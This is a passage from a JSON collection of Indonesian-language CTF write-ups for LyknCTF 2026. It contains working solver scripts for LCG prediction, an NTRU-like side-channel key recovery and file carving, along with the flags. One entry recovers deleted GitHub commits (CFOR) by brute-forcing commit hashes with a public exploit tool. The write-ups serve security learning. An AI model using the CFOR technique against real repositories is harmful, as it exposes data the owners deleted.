\n    # 3. Mencari Increment (c)\n    # states[1] = a * states[0] + c (mod m)\n    c = (states[1] - a * states[0]) % m\n    \n    return a, c, m\n\nr = remote(HOST, PORT)\n\noutputs = []\nfor i in range(12):\n    line = r.recvline().decode().strip()\n    val = int(line.split('=')[1].strip())\n    outputs.append(val)\n\nprint(f\"[+] Output yang diterima: {outputs}\")\n\nprint(\"[*] Melakukan kalkulasi parameter LCG (a, c, m)...\")\ntry:\n    a, c, m = crack_lcg(outputs)\n    print(f\"[+] LCG Terpecahkan!\")\n    print(f\"  a = {a}\")\n    print(f\"  c = {c}\")\n    print(f\"  m = {m}\")\n\n    # Menghitung prediksi out[12]\n    next_val = (a * outputs[-1] + c) % m\n    print(f\"[+] Prediksi out[12]: {next_val}\")\n\n    # Mengirimkan jawaban sebelum timeout\n    r.recvuntil(b\"out[12] = \")\n    r.sendline(str(next_val).encode())\n\n    # Membaca flag dari respon server\n    print(\"[*] Mengambil flag dari server...\")\n    print(r.recvall().decode())\n\nexcept Exception as e:\n    print(f\"[-] Terjadi kesalahan: {e}\")\n    r.close()"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "from pwn import *\r\nfrom math import gcd\r\nfrom functools import reduce\r\n\r\n# Konfigurasi koneksi\r\nHOST = '51.79.140.18'\r\nPORT = 15937\r\n\r\ndef solve_linear_congruence(a, b, m):\r\n    \"\"\"Menyelesaikan persamaan ax ≡ b (mod m) bahkan jika gcd(a, m) > 1\"\"\"\r\n    g = gcd(a, m)\r\n    if b % g != 0:\r\n        return None  # Tidak ada solusi\r\n    \r\n    # Reduksi persamaan dengan membaginya dengan GCD\r\n    a //= g\r\n    b //= g\r\n    m_prime = m // g\r\n    \r\n    # Sekarang gcd(a, m_prime) pasti 1, aman mencari modular inverse\r\n    try:\r\n        x = (b * pow(a, -1, m_prime)) % m_prime\r\n        # Kembalikan solusi dasar\r\n        return x\r\n    except ValueError:\r\n        return None\r\n\r\ndef crack_lcg(states):\r\n    # 1. Mencari Modulus (m)\r\n    diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])]\r\n    zero_mods = [d2 * d0 - d1**2 for d0, d1, d2 in zip(diffs, diffs[1:], diffs[2:])]\r\n    m = abs(reduce(gcd, zero_mods))\r\n    \r\n    # Jika m terlalu besar/merupakan kelipatan, kita bisa membersihkannya\r\n    # Namun biasanya m hasil GCD dari banyak sample sudah cukup akurat untuk modulo operasi berikutnya\r\n    \r\n    # 2. Mencari Multiplier (a)\r\n    # Persamaan: diffs[1] ≡ a * diffs[0] (mod m) => a * diffs[0] ≡ diffs[1] (mod m)\r\n    a = None\r\n    for i in range(len(diffs) - 1):\r\n        sol = solve_linear_congruence(diffs[i], diffs[i+1], m)\r\n        if sol is not None:\r\n            a = sol\r\n            # Validasi apakah 'a' ini konsisten untuk diff berikutnya\r\n            if (diffs[i+1] - a * diffs[i]) % m == 0:\r\n                break\r\n                \r\n    if a is None:\r\n        raise Exception(\"Gagal menemukan nilai 'a' yang valid.\")\r\n\r\n    # 3. Mencari Increment (c)\r\n    c = (states[1] - states[0] * a) % m\r\n    \r\n    return a, c, m\r\n\r\n# Mulai koneksi ke server\r\nr = remote(HOST, PORT)\r\n\r\n# Menerima text hingga baris output dimulai\r\nr.recvuntil(b\"Here are 12 consecutive outputs:\\n\")\r\n\r\n# Array untuk menyimpan 12 ouput\r\noutputs = []\r\n\r\nfor i in range(12):\r\n    line = r.recvline().decode().strip()\r\n    val = int(line.split('=')[1].strip())\r\n    outputs.append(val)\r\n\r\nprint(f\"[+] Berhasil mendapatkan 12 output: {outputs}\")\r\n\r\n# Jalankan fungsi crack LCG yang baru\r\nprint(\"[*] Menghitung parameter LCG (a, c, m)...\")\r\ntry:\r\n    a, c, m = crack_lcg(outputs)\r\n    print(f\"[+] Terpecahkan! \\n  a = {a}\\n  c = {c}\\n  m = {m}\")\r\n\r\n    # Hitung out[12]\r\n    next_val = (a * outputs[-1] + c) % m\r\n    print(f\"[+] Prediksi out[12]: {next_val}\")\r\n\r\n    # Kirim jawaban ke server\r\n    r.recvuntil(b\"out[12] = \")\r\n    r.sendline(str(next_val).encode())\r\n\r\n    # Cetak sisa flag yang muncul\r\n    print(\"[*] Mengirim jawaban dan mengambil flag...\")\r\n    print(r.recvall().decode())\r\n\r\nexcept Exception as e:\r\n    print(f\"[-] Terjadi kesalahan: {e}\")\r\n    r.close()"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{a8fda63902674a679e0d7d4fd088aab1}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-crypto-whispering",
    "title": "Whispering (LyknCTF 2026)",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "CTF Writeup: Whispering (LyknCTF 2026)",
    "problemDescription": "Tantangan ini mengimplementasikan sistem kriptografi berbasis kisi (lattice-based) mirip NTRU pada cincin polinomial:\n\n$$\\mathbb{Z}_q[x]/(x^N - 1)$$\n\nDengan parameter:\n\n$N = 127$\n\n$q = 2048$\n\n$p = 3$\n\n$q' = 2053$\n\nFlag enkripsi menggunakan AES-CBC, di mana kunci enkripsinya diturunkan melalui HKDF menggunakan sebuah algebraic signature ($V$) yang dihitung dari kunci privat $f$ dan $g$:\n\n$$V = \\sum (f \\cdot g) \\pmod{q'}$$\n\nMeskipun $f$ dan $g$ dirahasiakan, kita diberikan beberapa informasi tambahan (leakage) melalui endpoint /side_channel.json berupa:\n\nJumlah koefisien berindeks genap (even) dan ganjil (odd) dari $f$ dan $g$ dalam modulo $127$.",
    "tools": [],
    "analysis": "Kerentanan fatal dari skema ini terletak pada bagaimana algebraic signature ($V$) didefinisikan dan dihitung.\n\n### 2. Rekonstruksi Nilai Sum Melalui Center Lift\n\nDari bocoran side-channel, kita diberikan:\n\n$f_{\\text{even}} \\pmod{127}$ dan $f_{\\text{odd}} \\pmod{127}$\n\n$g_{\\text{even}} \\pmod{127}$ dan $g_{\\text{odd}} \\pmod{127}$\n\nKoefisien dari $f$ dan $g$ dibatasi pada nilai ternari $\\{-1, 0, 1\\}$. Karena derajat polinomial adalah $N = 127$, jumlah koefisien pada posisi genap maksimal adalah $64$, dan ganjil maksimal adalah $63$.\n\nKarena nilai jangkauan penjumlahan asli dari komponen ganjil maupun genap berada dalam rentang $[-64, 64]$—yang mana rentang ini berada di dalam batas setengah dari modulus bocoran ($127$)—kita dapat menerapkan teknik Center Lift untuk memulihkan nilai asli sebelum operasi modulo dilakukan:\n\n$$\\text{CenterLift}(x, m) = \n\\begin{cases} \nx - m & \\text{jika } x > \\frac{m}{2} \\\\\nx & \\text{lainnya}\n\\end{cases}$$\n\nSetelah mendapatkan nilai asli dari masing-masing komponen, kita tinggal menjumlahkannya untuk mendapatkan total penjumlahan koefisien:\n\n$$\\sum f = \\text{CenterLift}(f_{\\text{even}}, 127) + \\text{CenterLift}(f_{\\text{odd}}, 127)$$\n\n$$\\sum g = \\text{CenterLift}(g_{\\text{even}}, 127) + \\text{CenterLift}(g_{\\text{odd}}, 127)$$",
    "solution": [
      {
        "title": "1. Homomorfisma Penjumlahan Polinomial",
        "content": "Diberikan dua buah polinomial $f(x)$ dan $g(x)$, perkalian konvolusi mereka adalah $h(x) = f(x) \\cdot g(x)$. Ada identitas aljabar mendasar yang menyatakan bahwa jumlah dari seluruh koefisien polinomial hasil perkalian selalu sama dengan hasil kali dari jumlah koefisien masing-masing polinomial komponennya.\n\nSecara matematis:\n\n$$\\sum (f \\cdot g) = \\left(\\sum f\\right) \\times \\left(\\sum g\\right)$$\n\nSehingga nilai signature $V$ dapat disederhanakan menjadi:\n\n$$V \\equiv \\left(\\sum f\\right) \\times \\left(\\sum g\\right) \\pmod{q'}$$\n\nDengan demikian, kita tidak perlu memecahkan masalah kisi NTRU atau mencari polinomial $f$ dan $g$ secara penuh. Kita hanya perlu mengetahui nilai skalar dari total penjumlahan koefisien $\\sum f$ dan $\\sum g$."
      },
      {
        "title": "3. Menghitung Kunci Dekripsi",
        "content": "Setelah mendapatkan $\\sum f$ dan $\\sum g$, kita hitung nilai signature $V$:\n\n$$V = \\left(\\sum f \\times \\sum g\\right) \\pmod{2053}$$\n\nNilai $V$ ini kemudian langsung dimasukkan ke dalam fungsi KDF (HKDF-SHA256) untuk merekonstruksi kunci AES-CBC dan mendekripsi bendera (flag)."
      },
      {
        "title": "Skrip Eksploitasi (Python)",
        "content": "Skrip berikut melakukan pengambilan data dari server tantangan, memulihkan nilai $V$ menggunakan celah matematika di atas, merekonstruksi kunci AES, dan mendekripsi cipher flag secara instan.",
        "code": "import requests\nfrom Crypto.Cipher import AES\nfrom Crypto.Hash import SHA256\nfrom Crypto.Protocol.KDF import HKDF\nfrom Crypto.Util.Padding import unpad\n\nBASE_URL = \"http://257b4d35-2463-4079-b6a7-3b941a58e977.51.79.140.18.nip.io:8080\"\n\nprint(\"[*] Mengambil data publik dan side-channel...\")\npublic_data = requests.get(f\"{BASE_URL}/public.json\").json()\nside_channel = requests.get(f\"{BASE_URL}/side_channel.json\").json()\n\nN = public_data[\"parameters\"][\"N\"]\nq = public_data[\"parameters\"][\"q\"]\nq_prime = public_data[\"parameters\"][\"q_prime\"]\n\nenc_flag = public_data[\"encrypted_flag\"]\nciphertext = bytes.fromhex(enc_flag[\"ciphertext\"])\niv = bytes.fromhex(enc_flag[\"iv\"])\nsalt = enc_flag[\"salt\"]\n\nconstraints = side_channel[\"constraints\"]\nf_even_mod = constraints[\"f_even_sum_mod_127\"]\nf_odd_mod = constraints[\"f_odd_sum_mod_127\"]\ng_even_mod = constraints[\"g_even_sum_mod_127\"]\ng_odd_mod = constraints[\"g_odd_sum_mod_127\"]\n\ndef center_lift(val, mod=127):\n    \"\"\"Memetakan kembali nilai modulo ke rentang asli [-63, 64]\"\"\"\n    return val - mod if val > mod // 2 else val\n\nf_even = center_lift(f_even_mod)\nf_odd = center_lift(f_odd_mod)\ng_even = center_lift(g_even_mod)\ng_odd = center_lift(g_odd_mod)\n\nsum_f = f_even + f_odd\nsum_g = g_even + g_odd\n\nV = (sum_f * sum_g) % q_prime\nprint(f\"[+] Nilai V (Algebraic Signature) berhasil dipulihkan: {V}\")\n\nikm = (\n    V.to_bytes(4, \"big\")\n    + N.to_bytes(2, \"big\")\n    + q.to_bytes(2, \"big\")\n    + salt.encode(\"utf-8\")\n)\n\nkey = HKDF(\n    master=ikm,\n    key_len=32,\n    salt=str(N).encode(\"utf-8\"),\n    hashmod=SHA256,\n)\n\ncipher = AES.new(key, AES.MODE_CBC, iv)\ndecrypted = cipher.decrypt(ciphertext)\n\ntry:\n    flag = unpad(decrypted, AES.block_size).decode()\n    print(f\"\\n[+] FLAG DITEMUKAN: {flag}\")\nexcept Exception as e:\n    print(f\"[-] Gagal melakukan dekripsi (kemungkinan kalkulasi key salah): {e}\")"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "import requests\r\nfrom Crypto.Cipher import AES\r\nfrom Crypto.Hash import SHA256\r\nfrom Crypto.Protocol.KDF import HKDF\r\nfrom Crypto.Util.Padding import unpad\r\n\r\n# Ganti dengan URL instance-mu\r\nBASE_URL = \"http://257b4d35-2463-4079-b6a7-3b941a58e977.51.79.140.18.nip.io:8080\"\r\n\r\nprint(\"[*] Fetching data dari server...\")\r\npublic_data = requests.get(f\"{BASE_URL}/public.json\").json()\r\nside_channel = requests.get(f\"{BASE_URL}/side_channel.json\").json()\r\n\r\n# Ekstrak parameter publik\r\nN = public_data[\"parameters\"][\"N\"]\r\nq = public_data[\"parameters\"][\"q\"]\r\nq_prime = public_data[\"parameters\"][\"q_prime\"]\r\n\r\nenc_flag = public_data[\"encrypted_flag\"]\r\nciphertext = bytes.fromhex(enc_flag[\"ciphertext\"])\r\niv = bytes.fromhex(enc_flag[\"iv\"])\r\nsalt = enc_flag[\"salt\"]\r\n\r\n# Ekstrak side channel leakage\r\nconstraints = side_channel[\"constraints\"]\r\nf_even_mod = constraints[\"f_even_sum_mod_127\"]\r\nf_odd_mod = constraints[\"f_odd_sum_mod_127\"]\r\ng_even_mod = constraints[\"g_even_sum_mod_127\"]\r\ng_odd_mod = constraints[\"g_odd_sum_mod_127\"]\r\n\r\ndef center_lift(val, mod=127):\r\n    # Mengembalikan nilai asli ke rentang [-63, 64]\r\n    return val - mod if val > mod // 2 else val\r\n\r\n# Rekonstruksi nilai sum asli\r\nf_even = center_lift(f_even_mod)\r\nf_odd = center_lift(f_odd_mod)\r\ng_even = center_lift(g_even_mod)\r\ng_odd = center_lift(g_odd_mod)\r\n\r\nsum_f = f_even + f_odd\r\nsum_g = g_even + g_odd\r\n\r\n# Hitung nilai V (algebraic signature) langsung!\r\nV = (sum_f * sum_g) % q_prime\r\nprint(f\"[+] Recovered V (Algebraic Signature): {V}\")\r\n\r\n# Rekonstruksi HKDF Key derivation sesuai server\r\nikm = (\r\n    V.to_bytes(4, \"big\")\r\n    + N.to_bytes(2, \"big\")\r\n    + q.to_bytes(2, \"big\")\r\n    + salt.encode(\"utf-8\")\r\n)\r\n\r\nkey = HKDF(\r\n    master=ikm,\r\n    key_len=32,\r\n    salt=str(N).encode(\"utf-8\"),\r\n    hashmod=SHA256,\r\n)\r\n\r\n# Dekripsi ciphertext flag\r\ncipher = AES.new(key, AES.MODE_CBC, iv)\r\ndecrypted = cipher.decrypt(ciphertext)\r\n\r\ntry:\r\n    flag = unpad(decrypted, AES.block_size).decode()\r\n    print(f\"\\n[+] FLAG FOUND: {flag}\")\r\nexcept Exception as e:\r\n    print(f\"[-] Gagal melakukan unpadding, kemungkinan key salah: {e}\")"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{c85ccad898a34224aa92a2f1ae9ecae5}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-foren-echo",
    "title": "Echoes - LyknCTF 2026",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "Writeup: Echoes - LyknCTF 2026",
    "problemDescription": "Writeup: Echoes - LyknCTF 2026\n\nCategory: Forensics",
    "tools": [],
    "analysis": "### Informasi Awal\n\nChallenge ini memberikan tautan ke repositori GitHub (https://github.com/datxmilanista-png/echoes). Di repositori tersebut hanya ada satu branch main dengan satu file README.md yang berisi deskripsi:\n\n\"Nothing to see here. I already deleted everything. Inspire by Phantom.\"\n\nMelihat deskripsi yang menyebutkan \"deleted everything\" dan referensi \"Phantom\", ini mengarah langsung ke teknik eksploitasi dangling commits dari challenge Phantom di TAMU CTF.\n\nInti dari teknik ini adalah: commit yang dilakukan di sebuah fork yang kemudian di-private atau dihapus, masih tetap tersimpan di database backend GitHub (Cross Fork Object Reference / CFOR). Commit ini tidak akan muncul di git log biasa maupun REST API standard GitHub jika kita tidak mengetahui hash SHA-1 spesifiknya.\n\n### Eksploitasi CFOR\n\nKarena kita tidak tahu hash commit-nya dan tidak mungkin menebak 40 karakter SHA-1 secara acak, kita harus melakukan brute-force pada 4 karakter pertama (short SHA-1) yang memiliki 65.536 kombinasi. REST API biasa akan langsung terkena rate limit untuk percobaan sebanyak ini. Oleh karena itu, GraphQL API GitHub digunakan karena memungkinkan pengecekan ratusan hash dalam satu query.\n\nUntuk mempercepat, kita bisa menggunakan script eksploitasi publik seperti cfor_exploit dari SorceryIE.\n\nSetup eksploitasi:\n\ngit clone https://github.com/SorceryIE/cfor_exploit.git\ncd cfor_exploit\ncp example_config.py config.py\n\nsed -i \"s/gh_token = .*/gh_token = \\\"$GITHUB_TOKEN\\\"/\" config.py\n\npython3 cfor_exp.py -t https://github.com/datxmilanista-png/echoes\n\n\nScript tersebut mengeksekusi ratusan query GraphQL dan berhasil menemukan satu hash rahasia:\n\n### Ekstraksi dan Decoding\n\nDengan hash tersebut, kita bisa langsung melihat isi commit-nya melalui browser atau curl:\nhttps://github.com/datxmilanista-png/echoes/commit/262a12026254d3b666356848befd24e0dfa6f872\n\nTernyata hint image_ec85a6.png sengaja dibuat sebagai jebakan (red herring). Commit tersebut tidak berisi file gambar, melainkan sebuah script Python yang ditinggalkan oleh author:\n\n```python\n#!/usr/bin/env python3\n\n_raw = (\n    \"d727336733270366f5336713c6f5534713d6d603\"\n    \"36f54633e64386072703b7644534e4b495c4\"\n    \"\"\n)\n\ndef _recover(s):\n    return bytes.fromhex(s[::-1]).decode()\n\nif __name__ == \"__main__\":\n    # print(_recover(_raw))  # uncomment when ready\n    pass\n```\n\nScript ini menyimpan ciphertext dalam bentuk hexadecimal string (_raw). Fungsi _recover akan membalikkan urutan string (reverse) tersebut, mengubahnya dari hex menjadi bytes, lalu mendecode kembali ke format string ASCII.\n\nKita bisa mendapatkan flag dengan langsung mengeksekusi logika fungsi tersebut menggunakan Python one-liner:\n\n```bash\npython3 -c \"print(bytes.fromhex('d727336733270366f5336713c6f5534713d6d60336f54633e64386072703b7644534e4b495c4'[::-1]).decode())\"\n```",
    "solution": [],
    "terminalOutputs": [],
    "flag": "LYKNCTF{0rph4n3d_c0mm1t5_l1v3_f0r3v3r}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-foren-followtrain",
    "title": "Follow The Layer",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "**CTF:** LYKNCTF 2026  \n**Category:** Forensics  \n**Flag:** `LYKNCTF{7e401f8004084d4bf9f792535fdf5b89138a935d027b6b75ceb2dd3ac8838fab:03/21/2025:FUNNULL}`",
    "problemDescription": "Hash awal adalah transaksi TRC20 USDT di jaringan TRON. Dana dilacak sampai masuk ke hot wallet exchange berlabel `Bitget 9`.\n\n```text\nTXk7... --2700 USDT--> TNmR...\nTNmR... --5222 USDT--> TQMq...\nTQMq... --5222 USDT--> TJ7hh... [Bitget 9]\n```\n\nNominal 5.222 USDT masih berpindah utuh pada hop terakhir. Setelah masuk `Bitget 9`, dana bercampur dengan transaksi pengguna lain sehingga atribusi individual berhenti.",
    "tools": [],
    "analysis": "### 1. Transaksi awal\n\n```bash\ncurl -s \\\n  'https://apilist.tronscan.org/api/transaction-info?hash=d4500023a8114caaa640ab92bb8f73830a5303ccdfc4e9b0cf862bdae7ae336b' |\njq .\n```\n\nHasil transfer:\n\n```text\nFrom   : TXk7Dor9GeRRpR5hbCGd4rBieM21v4BcwX\nTo     : TNmRfnSUXZoWWzxcDDbf95eGQYXt1mJDt8\nAmount : 2,700 USDT\nDate   : 02/27/2025\nTXID   : d4500023a8114caaa640ab92bb8f73830a5303ccdfc4e9b0cf862bdae7ae336b\n```\n\nWallet `TNmR...` terkait dengan sanctioned entity **FUNNULL**.\n\n### 2. Outgoing dari TNmR\n\n```bash\ncurl -sG 'https://apilist.tronscan.org/api/transfer/trc20' \\\n  --data-urlencode 'address=TNmRfnSUXZoWWzxcDDbf95eGQYXt1mJDt8' \\\n  --data-urlencode 'trc20Id=TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' \\\n  --data-urlencode 'start=0' \\\n  --data-urlencode 'limit=50' \\\n  --data-urlencode 'direction=1' \\\n  --data-urlencode 'reverse=false' \\\n  --data-urlencode 'db_version=1' \\\n  --data-urlencode 'start_timestamp=1740661449000' |\njq -r '.data[] | [.block_timestamp, (.amount|tonumber/1000000), .from, .to, .hash] | @tsv'\n```\n\nTransfer yang relevan:\n\n```text\nTNmRfnSUXZoWWzxcDDbf95eGQYXt1mJDt8\n    -> TQMq9s5eqxzHW9CG4hgrWxVZaz4oZDo3tb\n\nAmount : 5,222 USDT\nTXID   : 2ef09557180070d4bfd274f771619b062fa9a1dec5087869b45e65003256b9d9\n```\n\n### 3. Sweep ke Bitget\n\nWallet `TQMq...` meneruskan nominal yang sama hanya beberapa menit kemudian:\n\n```text\nFrom   : TQMq9s5eqxzHW9CG4hgrWxVZaz4oZDo3tb\nTo     : TJ7hhYhVhaxNx6BPyq7yFpqZrQULL3JSdb\nAmount : 5,222 USDT\nDate   : 03/21/2025\nTXID   : 7e401f8004084d4bf9f792535fdf5b89138a935d027b6b75ceb2dd3ac8838fab\n```\n\nDetail transaksi mengandung label:\n\n```json\n{\n  \"addressTag\": {\n    \"TJ7hhYhVhaxNx6BPyq7yFpqZrQULL3JSdb\": \"Bitget 9\"\n  }\n}\n```\n\n### 4. Kenapa ini last traceable hop\n\nRiwayat `TQMq...` menunjukkan pola deposit address exchange:\n\n1. `Bitget 9` mengirim TRX untuk biaya gas.\n2. Alamat deposit menerima USDT.\n3. Seluruh USDT disapu ke `Bitget 9`.\n\nSesudah masuk hot wallet, terlihat banyak payout dengan nominal dan tujuan berbeda dalam hitungan detik. Dana sudah bercampur di pool exchange sehingga tidak ada pemetaan deterministik ke transaksi keluar tertentu.\n\nMaka jawaban akhirnya:\n\n```text\nHash   : 7e401f8004084d4bf9f792535fdf5b89138a935d027b6b75ceb2dd3ac8838fab\nDate   : 03/21/2025\nEntity : FUNNULL\n```",
    "solution": [
      {
        "title": "Solver",
        "content": "",
        "code": "python3 solve.py"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{7e401f8004084d4bf9f792535fdf5b89138a935d027b6b75ceb2dd3ac8838fab:03/21/2025:FUNNULL}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-foren-remedy",
    "title": "Remedy",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "Challenge Remedy asks to extract a hidden flag from `challeng.png`.",
    "problemDescription": "Challenge Remedy asks to extract a hidden flag from `challeng.png`.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Steps",
        "content": "1. **Metadata Inspection**:\n   Using `exiftool` on `challeng.png` reveals several suspicious metadata fields:\n   - `User Comment`: `Gnxvat Cubgbf Znlor Sha` -> ROT13 decodes to `Taking Photos Maybe Fun`\n   - `Description`: `6d14166842b6ecb67622284a65bde8a87e03344564bde3ab7e1e324b648dc4a87e0a2f4976bdffbd7e0233435ea6cbb45c`\n\n2. **XOR Key Recovery**:\n   - The hex bytes of the description length is 49.\n   - Assuming a typical 8-byte XOR key structure and the flag prefix `LYKNCTF{`:\n     `Key = ciphertext[:8] ^ \"LYKNCTF{\"`\n   - Key: `b'!M]&\\x01\\xe2\\xaa\\xcd'` (Hex: `214d5d2601e2aacd`)\n   - Decrypting the ciphertext yields the flag: `LYKNCTF{Would_Be_Nice_If_Someone_Grow_Up_One_Day}`"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "desc_hex = \"6d14166842b6ecb67622284a65bde8a87e03344564bde3ab7e1e324b648dc4a87e0a2f4976bdffbd7e0233435ea6cbb45c\"\r\nct = bytes.fromhex(desc_hex)\r\nprefix = b\"LYKNCTF{\"\r\nkey = bytes([b ^ p for b, p in zip(ct[:8], prefix)])\r\nflag = bytes([ct[i] ^ key[i % len(key)] for i in range(len(ct))]).decode()\r\nprint(flag)"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{Would_Be_Nice_If_Someone_Grow_Up_One_Day}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-foren-thanhhoa1",
    "title": "Thanh Hoa 2 — Forensics",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "**CTF:** LYKNCTF 2026  \n**Category:** Forensics  \n**Challenge:** Thanh Hoa 2  \n**Description:** `36 Thanh Hoa`  \n**Flag:** `LYKNCTF{NGU01_TH4NH_H04_4N_R4U_M4_PH4_DU0NG_T4U}`",
    "problemDescription": "File `lyknctf(2).mp4` punya ZIP AES yang ditempel di akhir file. Arsip tersebut berisi `flag.txt`, tetapi butuh password.\n\nPetunjuk password disimpan pada audio. Audio challenge kedua sangat mirip dengan video `Thanh Hoa` sebelumnya, tetapi memiliki lapisan tambahan. Setelah kedua audio disamakan skalanya lalu dikurangkan, spektrogram residual menampilkan tulisan:\n\n```text\nRAUMAPHATAU RAUMAPHATAU RAUMAPHATAU ...\n```\n\nPassword `RAUMAPHATAU` membuka ZIP dan menghasilkan flag.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "1. Triage MP4",
        "content": "Cek tipe file dan stream media:\n\n\n\nHasil utamanya:\n\n\n\nCari string dan signature arsip:\n\n\n\n`flag.txt` muncul di bagian paling akhir file. Pencarian signature ZIP memberi offset:",
        "code": "file 'lyknctf(2).mp4'\nffprobe -v error -show_format -show_streams 'lyknctf(2).mp4'"
      },
      {
        "title": "Output:",
        "content": "Artinya ZIP ditempel mulai offset `31910541` sampai EOF.",
        "code": "31910541"
      },
      {
        "title": "2. Carve ZIP",
        "content": "Isi arsip:\n\n\n\n`zipinfo -v` menunjukkan compression method `99` dan extra field `0x9901`, ciri WinZip AES. Jadi `flag.txt` belum bisa dibaca tanpa password.",
        "code": "dd if='lyknctf(2).mp4' of=hidden.zip bs=1 skip=31910541 status=none\nfile hidden.zip\nunzip -l hidden.zip"
      },
      {
        "title": "3. Bandingkan audio dengan challenge sebelumnya",
        "content": "Video kedua punya durasi dan isi visual yang sama dengan file `lyknctf.mp4` dari challenge sebelumnya. Perbedaannya paling terasa pada bitrate audio:\n\n\n\nEkstrak kedua audio sebagai PCM dengan sample rate dan channel yang sama:\n\n\n\nKalau langsung dibuat spektrogram, tulisan masih tertutup musik. Solusinya adalah mengurangi sinyal lama dari sinyal baru.\n\nSkala optimal dihitung dengan least squares:\n\n\n\nKode untuk membuat spektrogram residual 60 detik pertama:\n\n\n\nPada rentang sekitar 6–12 kHz terlihat teks besar yang diulang:\n\n\n\nIni juga cocok dengan stereotip/ungkapan Thanh Hóa tentang `rau má phá tàu`, sehingga bukan string acak.",
        "code": "Thanh Hoa 1: sekitar 128 kbps\nThanh Hoa 2: sekitar 197 kbps"
      },
      {
        "title": "4. Buka ZIP",
        "content": "Gunakan tulisan dari spektrogram sebagai password:",
        "code": "7z x hidden.zip -pRAUMAPHATAU\ncat flag.txt"
      },
      {
        "title": "Output:",
        "content": "",
        "code": "LYKNCTF{NGU01_TH4NH_H04_4N_R4U_M4_PH4_DU0NG_T4U}"
      },
      {
        "title": "5. Solver final",
        "content": "`solve.py` melakukan langkah yang dibutuhkan setelah password ditemukan:\n\n1. Mencari local header ZIP terakhir di MP4.\n2. Mengambil seluruh data dari offset ZIP sampai EOF.\n3. Mendekripsi WinZip AES dengan password `RAUMAPHATAU`.\n4. Mendekompresi `flag.txt`.\n5. Mencetak flag."
      },
      {
        "title": "Jalankan:",
        "content": "",
        "code": "source /home/nata/ctf_env/bin/activate\npython3 solve.py 'lyknctf(2).mp4'"
      },
      {
        "title": "Output:",
        "content": "",
        "code": "[+] ZIP offset : 31910541\n[+] Password   : RAUMAPHATAU\n[+] Extracted  : flag.txt\n<FLAG>LYKNCTF{NGU01_TH4NH_H04_4N_R4U_M4_PH4_DU0NG_T4U}</FLAG>"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{NGU01_TH4NH_H04_4N_R4U_M4_PH4_DU0NG_T4U}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-foren-thanhhoa2",
    "title": "Thanh Hoa 2 — Forensics",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "**CTF:** LYKNCTF 2026  \n**Category:** Forensics  \n**Challenge:** Thanh Hoa 2  \n**Description:** `36 Thanh Hoa`  \n**Flag:** `LYKNCTF{N3M_CHU4_TH4NH_H04_D4C_S4N_XU_TH4NH}`",
    "problemDescription": "**CTF:** LYKNCTF 2026  \n**Category:** Forensics  \n**Challenge:** Thanh Hoa 2  \n**Description:** `36 Thanh Hoa`  \n**Flag:** `LYKNCTF{N3M_CHU4_TH4NH_H04_D4C_S4N_XU_TH4NH}`",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "TL;DR",
        "content": "File MP4 punya stream PNG bertipe `attached_pic`. Tepat setelah chunk `IEND` PNG tersebut, ada ZIP AES yang ditempel sampai akhir file. Password ZIP disimpan lewat LSB pada channel RGB cover dan terbaca sebagai `NEMCHUATHANHHOA`. Setelah ZIP dibuka, `flag.txt` berisi flag final."
      },
      {
        "title": "1. Recon file",
        "content": "Mulai dari identifikasi container dan stream yang ada.\n\n\n\nOutput penting dari `ffprobe`:\n\n\n\nStream ketiga bukan frame video biasa, tetapi cover PNG yang ditanam sebagai attached picture.",
        "code": "file lyknctf.mp4\nffprobe -v error -show_streams lyknctf.mp4"
      },
      {
        "title": "2. Ekstrak cover PNG",
        "content": "Cover bisa diekstrak langsung tanpa re-encode.\n\n\n\nHasilnya merupakan PNG valid berukuran `1280x720`. Secara visual cuma gambar bokeh, jadi petunjuknya tidak berada pada tampilan normal gambar.",
        "code": "ffmpeg -v error -i lyknctf.mp4 -map 0:2 -c copy raw_cover.png"
      },
      {
        "title": "3. Temukan ZIP yang ditempel ke MP4",
        "content": "Pencarian signature menunjukkan PNG berada dekat akhir file dan ada local header ZIP setelahnya.\n\n\n\nOutput pada file yang diberikan:\n\n\n\nChunk `IEND` PNG berakhir tepat sebelum offset ZIP. Arsip kemudian di-carve mulai dari offset `28817164`.\n\n\n\nIsi arsip:\n\n\n\n`flag.txt` menggunakan WinZip AES, jadi isinya belum bisa dibaca tanpa password.",
